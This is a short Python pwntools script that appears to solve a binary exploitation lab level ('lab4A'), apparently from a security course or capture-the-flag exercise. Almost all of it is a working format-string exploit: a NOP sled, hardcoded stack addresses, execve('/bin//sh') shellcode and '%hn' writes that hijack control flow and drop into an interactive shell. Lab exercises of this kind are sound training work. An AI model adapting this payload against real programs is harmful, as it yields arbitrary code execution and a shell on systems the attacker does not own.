from pwn import *
import os
import shutil

os.mkdir("./backups")
open("./backups/.log", "w+")
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
arg = "\x90" + p32(0xbffff52e) + p32(0xbffff52c) + "\x90" * 150 + shellcode + "%48969x" + "%14$hn" + "%13440x" + "%15$hn"

r = process(['/tmp/transcen/r.sh', '/levels/lab04/lab4A', arg])
r.interactive()

shutil.rmtree("./backups")
